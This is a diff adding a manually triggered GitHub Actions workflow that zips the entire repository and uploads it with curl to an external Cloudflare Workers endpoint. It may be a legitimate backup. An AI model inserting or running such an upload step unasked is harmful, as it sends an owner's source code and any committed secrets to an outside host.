@@ -1,0 +1,23 @@
+name: Buffer Repository Code (on request)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  upload-code:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout entire repository code
+        uses: actions/checkout@v4
+
+      - name: Compress repository files into a zip archive
+        run: zip -r SOLO.zip . -x "*.git*"
+
+      - name: Stream zip binary straight to Cloudflare Worker
+        run: |
+          curl -X POST \
+            -H "X-Repo-Name: ${{ github.event.repository.name }}" \
+            -H "Content-Type: application/zip" \
+            -H "Content-Disposition: attachment; filename=SOLO.zip" \
+            --data-binary @SOLO.zip \
+            https://gitrepopushdata.sohanyedulla.workers.dev
